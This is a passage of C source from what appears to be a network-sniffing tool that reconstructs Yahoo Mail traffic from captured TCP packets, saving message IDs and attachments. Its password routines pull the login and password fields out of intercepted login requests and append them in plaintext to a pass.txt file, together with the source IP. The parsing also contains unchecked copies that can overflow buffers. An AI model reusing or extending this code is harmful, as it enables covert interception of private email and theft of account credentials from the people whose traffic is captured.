   gettimeofday(&tv,&tz);
   snprintf(str, MAX_PATH_LEN, "%s/%lu-%lu_%s", attach_down_path, tv.tv_sec, tv.tv_usec,filename);
      
   int fd;
   
   
   if(!is_chunk)
   {
     fd = open(str, O_RDWR | O_CREAT, file_mode);
     write(fd, p1, length);
     close(fd);
   }
   else
   {
     p1=strstr(p1,"\r\n");
     if(p1==NULL) return -1;
     p1 += 2;
     
     if(pzip_judge)
     {
       strcat(str,".gz");
       ngz=1;
       fd = open(str, O_RDWR | O_CREAT, file_mode);
       write(fd, p1, length);
       close(fd);
     }
     else
     {
       fd = open(str, O_RDWR | O_CREAT, file_mode);
       write(fd,p1,length);
       close(fd);
     }
     
   }
   
   char str_file[MAX_PATH_LEN];
   if (!ngz)
   {
      snprintf(str_file, MAX_PATH_LEN, "%lu-%lu_%s",tv.tv_sec, tv.tv_usec, filename);
   }
   else
   {
     snprintf(str_file,MAX_PATH_LEN,"%lu-%lu_%s.gz",tv.tv_sec,tv.tv_usec,filename);
   }
   
   UpdateAttach(str_file, mail_info->mail_id);
   del_mail_node(mail_info);
}
#endif

int analyse_yahoo_cn_attach_recive(Mail_info *mail_info,char *data,unsigned int datalen, struct tcphdr *tcp,int is_b_s)
{//printf("\nanalyse_yahoo_cn_attach_recive...\n");//this function is to analyse attach file without downloading all 
	unsigned int seq=ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	unsigned int attach_len;
	int n;
	static int no_len;

	if (is_b_s)
	{
		//char tmp_id[MAX_ID_LEN+1];
		int result;
		
		if (!strncmp(data,"GET /cn.",8) || !strncmp(data,"GET /hk.",8))
		{
			char *p1,*p2;
			int len;
			p1=data;
			if(p1==NULL) return -1;
			//p2=strstr(p1,"&mid=");
			p2=memfind(p1,"mid=",300);
			if (p2==NULL)
			{
				p2=strstr(p1,"mid%3D");
				if(p2==NULL) return -1;
				else
				{
					p1=p2+6;
					p2 = strstr(p1,"%26fid");
				}
			}
			else
			{
				p1=p2+4;
				p2 = strstr(p1,"&");
			}
			if (p2==NULL) return -1;
			len = p2-p1;
			if (len < 0 || len > MAX_ID_LEN) return -1;
			memcpy(mail_info->mail_id, p1, len);
			mail_info->mail_id[len] = 0; 
			htmldecode_full(mail_info->mail_id,mail_info->mail_id);
			htmldecode_full(mail_info->mail_id,mail_info->mail_id);              //printf("mail_info->mail_id2 = %s\n", mail_info->mail_id);
			//memcpy(mail_info->mail_id,p1,len);
			//mail_info->mail_id[len] = 0;
		}
	}
	else
	{
		if (!strncmp(data,"HTTP/1.1 200 OK\r\n",15))
		{
			mail_info->recive_length=get_http_length(data);
			//n=judge_chunk(data);
			//attach_len = mail_info->recive_length;
			if(mail_info->recive_length>0)
				mail_info->recive_length += 1000;
			else
			{
				no_len = 1;
				mail_info->recive_length = 1;
			}
			mail_info->recive_data = (char *)malloc(mail_info->recive_length);
			if(mail_info->recive_data == NULL)
			{
				return -1;
			}
			memset(mail_info->recive_data,0,mail_info->recive_length);
			mail_info->http_seq = seq;
			
		}
		if (mail_info->recive_data !=NULL)
		{
			if(no_len == 1)
			{
				mail_info->recive_length += datalen;
				mail_info->recive_data = (char*)realloc(mail_info->recive_data,mail_info->recive_length);
			}
			off_seq = seq - mail_info->http_seq;
			range = off_seq + datalen;
			if (range > mail_info->recive_length)
			{
				return -1;
			}
			memcpy(mail_info->recive_data+off_seq,data,datalen);
		}
		if (tcp->fin == 1 || !memcmp(data + datalen - 5, "0\r\n\r\n", 5) || mail_info->recive_length-1000 == off_seq+datalen-(strstr(mail_info->recive_data,"\r\n\r\n")+4-mail_info->recive_data))
		{
			mail_info->is_complished = 1;
			//write_yahoo_attach_down(mail_info, attach_len, n);
			// attach_len=get_http_length_1(mail_info->recive_data);
			//n=judge_chunk_1(mail_info->recive_data);
			attach_len=get_http_length_2(mail_info->recive_data,&n);
			if(attach_len <=0 && mail_info->recive_data!=NULL && strstr(mail_info->recive_data,"\r\n\r\n"))
				attach_len = mail_info->recive_length-(strstr(mail_info->recive_data,"\r\n\r\n")+4-mail_info->recive_data)-1;
			if(attach_len <=0)
				return -1;
// printf("\nattach_len = %d\n",attach_len);
			write_attach_down_1(mail_info,attach_len,n);
			del_mail_node(mail_info);
		}
	}
	return 0;
}

int analyse_yahoo_com_attach_recive(Mail_info *mail_info,char *data,unsigned int datalen, struct tcphdr *tcp,int is_b_s)
{//this function is to analyse attach file without downloading all
	unsigned int seq=ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	unsigned int attach_len;
	int n;
	
	if (is_b_s)
	{
		char tmp_id[MAX_ID_LEN+1];
		int result;
		
		if (!strncmp(data,"GET /us.",8))
		{
			char *p1,*p2;
			int len;
			p1=data;
			if(p1==NULL) return -1;
			p1=strstr(data,"mid=");
			if (p1==NULL)
			{
				p1=strstr(data,"&archivename=");
				if(p1==NULL) return -1;
				p1+=13;
				p2 = strstr(p1,".");
				if(p2==NULL) return -1;
				len = p2-p1;
				if (len < 0 || len > MAX_ID_LEN) return -1;
				memcpy(mail_info->connect_id,p1,len);
				mail_info->connect_id[len] = 0;
				Mail_info *pre_mail = NULL;
				pre_mail = find_mail_head2(mail_info->connect_id, mail_info, mail_info->mail_type);
				if (pre_mail != NULL && pre_mail->mail_id != NULL)
				{
					memcpy(mail_info->mail_id,pre_mail->mail_id,strlen(pre_mail->mail_id));
					mail_info->mail_id[strlen(pre_mail->mail_id)] = 0;
					del_mail_node(pre_mail);
				}
			}
			else
			{
				p1+=4;
				p2 = strstr(p1,"&fid=");
				if (p2==NULL) return -1;
				len = p2-p1;
				if (len < 0 || len > MAX_ID_LEN)
					return -1;
				memcpy(tmp_id,p1,len);
				tmp_id[len] = 0;
				//memcpy(mail_info->mail_id,p1,len);
				//mail_info->mail_id[len] = 0;
				htmldecode_full(tmp_id,mail_info->mail_id);
				//printf("attach_id : %s\n", mail_info->mail_id);
			}
		}
	}
	else
	{
		if (!strncmp(data,"HTTP/1.1 200 OK\r\n",15))
		{//1
			mail_info->recive_length=get_http_length(data);
			//n=judge_chunk(data);
			//attach_len = mail_info->recive_length;
			if(mail_info->recive_length<=0)
			{
				return -1;
			}
			mail_info->recive_length += 1000;
			mail_info->recive_data = (char *)malloc(mail_info->recive_length);
			
			if(mail_info->recive_data == NULL)
			{
				return -1;
			}
			memset(mail_info->recive_data,0,mail_info->recive_length);
			mail_info->http_seq = seq;
       
		}//1
		if (mail_info->recive_data !=NULL)
		{
			off_seq = seq - mail_info->http_seq;
			if(off_seq < 0) return -1;
			range = off_seq + datalen;
			if (range >= mail_info->recive_length)
			{
				return -1;
			}
			memcpy(mail_info->recive_data+off_seq,data,datalen);
		}
		if (tcp->fin == 1 || 
			(datalen>0&&!memcmp(data + datalen - 5, "0\r\n\r\n", 5)) || 
			(mail_info->recive_length>0&&mail_info->recive_length-1000==off_seq+datalen-(strstr(mail_info->recive_data,"\r\n\r\n")+4-mail_info->recive_data)))
		{
			mail_info->is_complished = 1;
			attach_len=get_http_length_2(mail_info->recive_data,&n);
			if (attach_len <= 0) return -1;
			write_attach_down_1(mail_info,attach_len,n);
			del_mail_node(mail_info);
		}
	}
	return 0;
}

int analyse_yahoo_com_attachmid_recive(Mail_info *mail_info,char *data,unsigned int datalen, struct tcphdr *tcp,int is_b_s)
{
	int result;
	unsigned int seq=ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	int n;
	
	if (is_b_s)
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, datalen, tcp);
			return result;
		}
	}
	else
	{
		if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9))
		{
			mail_info->is_complished = 1;
			if(strstr(mail_info->mail_data,"\"archive\":false"))
				return -1;
			char *p1,*p2;
			int len;
			p1=mail_info->mail_data;
			if(p1==NULL) return -1;
			p1=strstr(p1,"\"mid\":\"");
			if (p1==NULL) return -1;
			p1+=7;
			p2 = strstr(p1,"\"");
			if (p2==NULL) return -1;
			len = p2-p1;
			if (len < 0 || len > MAX_ID_LEN)
				return -1;
			memcpy(mail_info->mail_id,p1,len);
			mail_info->mail_id[len] = 0;
			p1=strstr(p2,"\"archiveName\":\"");
			if (p1==NULL) return -1;
			p1+=15;
			p2 = strstr(p1,"\"");
			if (p2==NULL) return -1;
			len = p2-p1;
			if (len < 0 || len > MAX_ID_LEN)
				return -1;
			memcpy(mail_info->connect_id,p1,len);
			mail_info->connect_id[len] = 0;
		}
	}
	return 0;
}

void write_yahoo_psword(Mail_info *mail_info)
{//printf("\nwrite_yahoo_psword\n");
	
	char *p1 = NULL;
	char *p2 = NULL;
	char tmp_name[MAX_UN_LEN + 1];
	p1 = strstr(mail_info->mail_data, "login=");
	if(p1 == NULL)
	{
		return;
	}
	p1+=6;
	p2 = strstr(p1, "&passwd=");
	if(p2 == NULL)
	{
		return;
	}
        //memset(mail_info->username,0,MAX_UN_LEN+1);
	//memcpy(mail_info->username, p1, p2 - p1);
	memcpy(tmp_name, p1, p2 - p1);
	tmp_name[p2 - p1] = 0;
	htmldecode_full(tmp_name, mail_info->username);
	p2+=8;
	p1 = strstr(p2, "&");
	if(p1 == NULL)
	{
		return;
	}
	memset(mail_info->passwd, 0, MAX_UN_LEN+1);
	memcpy(mail_info->passwd, p2, p1 - p2);
	mail_info->passwd[p1 - p2] = 0;
	htmldecode_full(mail_info->passwd,mail_info->passwd);
	
    //LOG_INFO("usernamess = %s and password = %s\n",mail_info->username,mail_info->passwd);
	write_xml(mail_info);

	FILE *fp;
//	chdir(mail_data_path);
        char passpath[MAX_PATH_LEN];
	sprintf(passpath,"%s/pass.txt",mail_data_path);
	fp=fopen(passpath,"a+");
	if(fp==NULL) return;
	fprintf(fp,"\nusername=%s\npassword=%s\n",mail_info->username,mail_info->passwd);
	fclose(fp);

	insert_array(mail_info->username, mail_info->source_ip);
}
int analyse_yahoo_psword(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{//printf("\nanalyse_yahoo_psword\n");
	unsigned int seq = ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	char http_ok_head[11]="HTTP/1.1 ";
        
	if(is_b_s && !mail_info->is_complished)
	{
		if (mail_info->mail_length == 0)
		{
			mail_info->mail_length = 5000;
			mail_info->mail_data = (char *)malloc(5000);
			if(mail_info->mail_data ==NULL)
			{
				return -1;
			}
			memset(mail_info->mail_data,0,5000);
			mail_info->start_seq = seq;
		}
		if(mail_info->mail_length == 5000) 
		{
			int len;
			char *tmp;
			len = get_http_length(data);
			if (len > 0)
			{
				mail_info->mail_length += len;
				tmp = (char *)malloc(mail_info->mail_length);
				if(tmp ==NULL)
                {
					return -1;
				}
				memset(tmp,0,mail_info->mail_length);
				memcpy(tmp,mail_info->mail_data,5000);
				free(mail_info->mail_data);
				mail_info->mail_data = tmp;
			}
		}
		off_seq = seq - mail_info->start_seq;
		range=off_seq+datalen;
		if(range>mail_info->mail_length)
		{
			return -1;
		}
		memcpy(mail_info->mail_data+off_seq,data,datalen);
		if(strstr(mail_info->mail_data,"&passwd="))
		{
			write_yahoo_psword(mail_info);
			return -1;
		}
	}
	else if(!strncmp(data,http_ok_head,9))
	{
        //LOG_INFO("Data recive successfully!\n");
		write_yahoo_psword(mail_info);
		return -1;
	}
	return 0;
}

int analyse_yahoo(void *node, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s, int m_or_a)
{
	unsigned int type;
	int result = 0;
	if (!m_or_a) 
	{
		Mail_info *mail_info = (Mail_info *)node;
		type = mail_info->mail_type;
		type = type & 0x00FF;
		switch(type)
		{
			case 0x01: 
				result = analyse_yahoo_psword(mail_info,data,data_len,ptcp,is_to_s); 
				break;
			case 0x09: 
				result = analyse_yahoo_attach_mail(mail_info,data,data_len,ptcp,is_to_s); 
				break;
			case 0x11:
				result = analyse_yahoo_mail(mail_info, data, data_len, ptcp, is_to_s);
				break;
			case 0x15:
				result = analyse_yahoo_mail_cn(mail_info,data,data_len,ptcp, is_to_s);
				break;
			case 0x31:
				result = analyse_yahoo_recive(mail_info,data,data_len,ptcp,is_to_s);
				break;
			case 0x35:
				result = analyse_yahoocom_recive(mail_info,data,data_len,ptcp,is_to_s);
				break;
			case 0x36:
				result = analyse_yahoo_cn_attach_recive(mail_info,data,data_len,ptcp,is_to_s);
				break;
			case 0X37:
				result = analyse_yahoo_com_attach_recive(mail_info,data,data_len,ptcp,is_to_s);
				break;
			case 0x38:
				result = analyse_yahoo_com_attachmid_recive(mail_info,data,data_len,ptcp,is_to_s);
				break;
			default:
				break;
		}
		
		if(result == -1) 
			delete_mail_info(mail_info);
	} 
	else 
	{
		Attach_info *attach_info = (Attach_info *)node;
		type = attach_info->attach_type & 0x00FF;
		switch (type)
		{
			case 0x61:
				analyse_yahoo_attach(attach_info, data, data_len, ptcp, is_to_s);
				break;
			case 0x72:
				analyse_yahoo_attach_cn(attach_info, data, data_len, ptcp, is_to_s);
				break;
		}
	}
}

